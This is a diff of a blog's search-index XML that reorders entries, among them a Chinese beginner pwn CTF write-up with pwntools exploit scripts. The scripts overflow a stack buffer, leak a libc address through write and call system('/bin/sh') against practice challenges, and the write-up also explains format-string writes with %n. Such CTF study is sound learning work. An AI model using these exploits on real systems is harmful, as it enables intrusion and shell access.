@@ -33,6 +33,62 @@
       </tags>
   </entry>
   <entry>
+    <title>pwn:从一窍不通到入门的门前</title>
+    <url>/2022/07/06/pwn-%E4%BB%8E%E4%B8%80%E7%AA%8D%E4%B8%8D%E9%80%9A%E5%88%B0%E5%85%A5%E9%97%A8%E7%9A%84%E9%97%A8%E5%89%8D/</url>
+    <content><![CDATA[<p> 基础pwn例题，栈溢出，格式化字符串。</p>
+<span id="more"></span>
+<h3 id="栈溢出例题"><a href="#栈溢出例题" class="headerlink" title="栈溢出例题"></a>栈溢出例题</h3><h4 id="hello-pwn"><a href="#hello-pwn" class="headerlink" title="hello_pwn"></a>hello_pwn</h4><p>来源：攻防世界</p>
+<p>首先先checksec：</p>
+<p><img src="https://i.niupic.com/images/2022/09/04/a51X.png" alt=""></p>
+<p>再看伪代码：</p>
+<p><img src="https://i.niupic.com/images/2022/09/04/a51Y.png" alt=""></p>
+<p>再看偏移量：</p>
+<p><img src="https://i.niupic.com/images/2022/09/04/a51Z.png" alt=""></p>
+<p>这里基本就明白了：当dowrd_60106C=1853186401时，执行下面的sub函数，sub函数就直接得出flag了，因此只要再前一步的read函数那里创造栈溢出，再人为满足条件判断即可。</p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./hello_pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;111.200.241.244&#x27;,52016)</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p64(<span class="number">1853186401</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h4 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h4><p>来源：攻防世界</p>
+<p>checksec:</p>
+<p><img src="https://i.niupic.com/images/2022/09/04/a520.png" alt=""></p>
+<p>32位程序，开启堆栈不可执行，这是一道构造ROP的经典例题。</p>
+<p><img src="https://i.niupic.com/images/2022/09/04/a521.png" alt=""></p>
+<p>源码看出漏洞还是栈溢出，但是此时找不到现成的system函数和binsh字符串。</p>
+<p>因此要找到system函数，知识点(搬运自wiki)</p>
+<ul>
+<li>system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。</li>
+<li>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。</li>
+<li>查找Libc的网址：<a href="https://libc.blukat.me/">https://libc.blukat.me/</a>和<a href="https://libc.rip/">https://libc.rip/</a></li>
+</ul>
+<p>简单来说：实际的(真实的)地址是需要计算出来的，具体计算方式是：<strong>实际地址=libc偏移量+libc基地址</strong>在已知libc的情况下，我们需要做的就是找到<strong>libc的基址</strong>，而想要找到基址，我们需要知道一个函数的实际地址，本题中关键函数内存在write,read函数，因此想法是使用write函数泄露出write函数的真实地址，而plt表，got表，实际加载地址可以参考下图(搬运自csdn(滑稽))：</p>
+<p><img src="https://i.niupic.com/images/2022/09/04/a522.png" alt=""></p>
+<p>这样就可以得到基本的思路了: 先构造栈溢出使程序跳到write函数的plt表地址上，此时再次调用main函数或者vulnerable函数再次执行，此时就可以利用write函数打印出write的got表地址，此时需要我们人为的输入write函数的参数。这样就可以得到write函数的真实地址了。栈上的流程大概是这样的（仍然是搬运的(滑天下之大稽）：</p>
+<p><img src="https://i.niupic.com/images/2022/09/04/a523.png" alt=""></p>
+<p>这样输出之后我们就得到了write函数的真实地址了，再通过libc来求得system和binsh的真实地址，最后第二次调动程序，再次利用漏洞，就可以得到shell。</p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process(&#x27;./level3&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;61.147.171.105&#x27;</span>,<span class="number">59245</span>)</span><br><span class="line"></span><br><span class="line">padding=<span class="number">0x88</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc_32.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;:\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_got_addr=u32(p.recv()[:<span class="number">4</span>])</span><br><span class="line"><span class="built_in">print</span>(write_got_addr)</span><br><span class="line"></span><br><span class="line">libc_write=libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">libc_base=write_got_addr-libc_write</span><br><span class="line"></span><br><span class="line">system_addr=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;the system address is:&#x27;</span>,<span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_bin=<span class="built_in">next</span>(libc.search(<span class="string">b&quot;bin/sh&quot;</span>))//找到binsh偏移的方法</span><br><span class="line">bin_addr=libc_base+libc_bin</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;the binsh address is:&quot;</span>,<span class="built_in">hex</span>(bin_addr))</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*padding+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(system_addr)+p32(<span class="number">0xdeadbeef</span>)+p32(bin_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;:\n&#x27;</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h3><p>基本原理以及利用方法在wiki上有解释。</p>
+<p>&lt;<a href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/">原理介绍 - CTF Wiki (ctf-wiki.org)</a>&gt;</p>
+<p>主要意思是利用printf一类函数漏洞，当函数没有严格规定格式化字符串时，攻击者可以控制printf函数来输出其他内容，由于格式化字符串输出的是栈上内容，因此此漏洞可以找到栈上其他位置的信息，比如地址，数据。总结一下就是：超出的每一个格式化字符串都能对下一格栈空间造成影响。</p>
+<p>%d:打印成数字，只能泄露栈本身内容</p>
+<p>%x:打印成16进制，只能泄露栈本身内容</p>
+<p>%s:识别栈上内容为指针，打印出该指针指向的位置，这里有可能造成任意地址的泄露（只要能控制栈并完成布局）</p>
+<p>%c:输出字符</p>
+<p>%n:把前面已经打印的长度<strong>写入</strong>某个内存地址(实现任意地址写入)</p>
+<p>%n:写入4个字节，写入1—&gt;0000 0001</p>
+<p>%hn:写入两个字节，写入1—&gt;0001</p>
+<p>%hhn:写入单个字节,写入1—&gt;01</p>
+<h3 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h3><p>啥都没有，因为懒得搞，搞堆去了</p>
+<p><img src="https://i.niupic.com/images/2022/09/04/a51S.jpg" alt=""></p>
+]]></content>
+      <categories>
+        <category>CTF!</category>
+      </categories>
+      <tags>
+        <tag>基础</tag>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Java入门基础</title>
     <url>/2022/07/02/Java%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80/</url>
     <content><![CDATA[<p> Java初学，包含使用IDEA创建文件，基本程序等等</p>
@@ -153,62 +209,6 @@
       <tags>
         <tag>基础</tag>
         <tag>git</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>pwn:从一窍不通到入门的门前</title>
-    <url>/2022/07/06/pwn-%E4%BB%8E%E4%B8%80%E7%AA%8D%E4%B8%8D%E9%80%9A%E5%88%B0%E5%85%A5%E9%97%A8%E7%9A%84%E9%97%A8%E5%89%8D/</url>
-    <content><![CDATA[<p> 基础pwn例题，栈溢出，格式化字符串。</p>
-<span id="more"></span>
-<h3 id="栈溢出例题"><a href="#栈溢出例题" class="headerlink" title="栈溢出例题"></a>栈溢出例题</h3><h4 id="hello-pwn"><a href="#hello-pwn" class="headerlink" title="hello_pwn"></a>hello_pwn</h4><p>来源：攻防世界</p>
-<p>首先先checksec：</p>
-<p><img src="https://i.niupic.com/images/2022/09/04/a51X.png" alt=""></p>
-<p>再看伪代码：</p>
-<p><img src="https://i.niupic.com/images/2022/09/04/a51Y.png" alt=""></p>
-<p>再看偏移量：</p>
-<p><img src="https://i.niupic.com/images/2022/09/04/a51Z.png" alt=""></p>
-<p>这里基本就明白了：当dowrd_60106C=1853186401时，执行下面的sub函数，sub函数就直接得出flag了，因此只要再前一步的read函数那里创造栈溢出，再人为满足条件判断即可。</p>
-<p>exp:</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./hello_pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;111.200.241.244&#x27;,52016)</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p64(<span class="number">1853186401</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h4 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h4><p>来源：攻防世界</p>
-<p>checksec:</p>
-<p><img src="https://i.niupic.com/images/2022/09/04/a520.png" alt=""></p>
-<p>32位程序，开启堆栈不可执行，这是一道构造ROP的经典例题。</p>
-<p><img src="https://i.niupic.com/images/2022/09/04/a521.png" alt=""></p>
-<p>源码看出漏洞还是栈溢出，但是此时找不到现成的system函数和binsh字符串。</p>
-<p>因此要找到system函数，知识点(搬运自wiki)</p>
-<ul>
-<li>system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。</li>
-<li>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。</li>
-<li>查找Libc的网址：<a href="https://libc.blukat.me/">https://libc.blukat.me/</a>和<a href="https://libc.rip/">https://libc.rip/</a></li>
-</ul>
-<p>简单来说：实际的(真实的)地址是需要计算出来的，具体计算方式是：<strong>实际地址=libc偏移量+libc基地址</strong>在已知libc的情况下，我们需要做的就是找到<strong>libc的基址</strong>，而想要找到基址，我们需要知道一个函数的实际地址，本题中关键函数内存在write,read函数，因此想法是使用write函数泄露出write函数的真实地址，而plt表，got表，实际加载地址可以参考下图(搬运自csdn(滑稽))：</p>
-<p><img src="https://i.niupic.com/images/2022/09/04/a522.png" alt=""></p>
-<p>这样就可以得到基本的思路了: 先构造栈溢出使程序跳到write函数的plt表地址上，此时再次调用main函数或者vulnerable函数再次执行，此时就可以利用write函数打印出write的got表地址，此时需要我们人为的输入write函数的参数。这样就可以得到write函数的真实地址了。栈上的流程大概是这样的（仍然是搬运的(滑天下之大稽）：</p>
-<p><img src="https://i.niupic.com/images/2022/09/04/a523.png" alt=""></p>
-<p>这样输出之后我们就得到了write函数的真实地址了，再通过libc来求得system和binsh的真实地址，最后第二次调动程序，再次利用漏洞，就可以得到shell。</p>
-<p>exp：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process(&#x27;./level3&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;61.147.171.105&#x27;</span>,<span class="number">59245</span>)</span><br><span class="line"></span><br><span class="line">padding=<span class="number">0x88</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc_32.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;:\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_got_addr=u32(p.recv()[:<span class="number">4</span>])</span><br><span class="line"><span class="built_in">print</span>(write_got_addr)</span><br><span class="line"></span><br><span class="line">libc_write=libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">libc_base=write_got_addr-libc_write</span><br><span class="line"></span><br><span class="line">system_addr=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;the system address is:&#x27;</span>,<span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_bin=<span class="built_in">next</span>(libc.search(<span class="string">b&quot;bin/sh&quot;</span>))//找到binsh偏移的方法</span><br><span class="line">bin_addr=libc_base+libc_bin</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;the binsh address is:&quot;</span>,<span class="built_in">hex</span>(bin_addr))</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*padding+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(system_addr)+p32(<span class="number">0xdeadbeef</span>)+p32(bin_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;:\n&#x27;</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h3 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h3><p>基本原理以及利用方法在wiki上有解释。</p>
-<p>&lt;<a href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/">原理介绍 - CTF Wiki (ctf-wiki.org)</a>&gt;</p>
-<p>主要意思是利用printf一类函数漏洞，当函数没有严格规定格式化字符串时，攻击者可以控制printf函数来输出其他内容，由于格式化字符串输出的是栈上内容，因此此漏洞可以找到栈上其他位置的信息，比如地址，数据。总结一下就是：超出的每一个格式化字符串都能对下一格栈空间造成影响。</p>
-<p>%d:打印成数字，只能泄露栈本身内容</p>
-<p>%x:打印成16进制，只能泄露栈本身内容</p>
-<p>%s:识别栈上内容为指针，打印出该指针指向的位置，这里有可能造成任意地址的泄露（只要能控制栈并完成布局）</p>
-<p>%c:输出字符</p>
-<p>%n:把前面已经打印的长度<strong>写入</strong>某个内存地址(实现任意地址写入)</p>
-<p>%n:写入4个字节，写入1—&gt;0000 0001</p>
-<p>%hn:写入两个字节，写入1—&gt;0001</p>
-<p>%hhn:写入单个字节,写入1—&gt;01</p>
-<h3 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h3><p>啥都没有，因为懒得搞，搞堆去了</p>
-<p><img src="https://i.niupic.com/images/2022/09/04/a51S.jpg" alt=""></p>
-]]></content>
-      <categories>
-        <category>CTF!</category>
-      </categories>
-      <tags>
-        <tag>基础</tag>
-        <tag>pwn</tag>
       </tags>
   </entry>
   <entry>
@@ -444,25 +444,6 @@
 ]]></content>
   </entry>
   <entry>
-    <title>计算机体系结构复习</title>
-    <url>/2022/06/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/</url>
-    <content><![CDATA[<p> 大一下预习计算机体系结构</p>
-<span id="more"></span>
-<h4 id="原码反码补码"><a href="#原码反码补码" class="headerlink" title="原码反码补码"></a>原码反码补码</h4><ul>
-<li>原码：二进制形式</li>
-<li>反码：原码除符号位不变，其余全部取反</li>
-<li>补码：反码加一 ($a-b$的意思是a加上b的补码)</li>
-</ul>
-<p>减法器可以用一个加法器，一个非门，一个VDD组合构成。</p>
-]]></content>
-      <categories>
-        <category>大一课程</category>
-      </categories>
-      <tags>
-        <tag>计算机原理</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>线代预习一些知识</title>
     <url>/2022/06/19/%E7%BA%BF%E4%BB%A3%E5%A4%8D%E4%B9%A0%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86/</url>
     <content><![CDATA[<p> 这里是复习线代的时候怕遗忘摆的一些小知识，属于是预习过后的产物了(bushi</p>
@@ -585,6 +566,25 @@ $$\Lambda=X^-1\*A\*X</script><script type="math/tex; mode=display">A=X^-1\*\Lamb
       <tags>
         <tag>语法</tag>
         <tag>markdown</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>计算机体系结构复习</title>
+    <url>/2022/06/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/</url>
+    <content><![CDATA[<p> 大一下预习计算机体系结构</p>
+<span id="more"></span>
+<h4 id="原码反码补码"><a href="#原码反码补码" class="headerlink" title="原码反码补码"></a>原码反码补码</h4><ul>
+<li>原码：二进制形式</li>
+<li>反码：原码除符号位不变，其余全部取反</li>
+<li>补码：反码加一 ($a-b$的意思是a加上b的补码)</li>
+</ul>
+<p>减法器可以用一个加法器，一个非门，一个VDD组合构成。</p>
+]]></content>
+      <categories>
+        <category>大一课程</category>
+      </categories>
+      <tags>
+        <tag>计算机原理</tag>
       </tags>
   </entry>
   <entry>
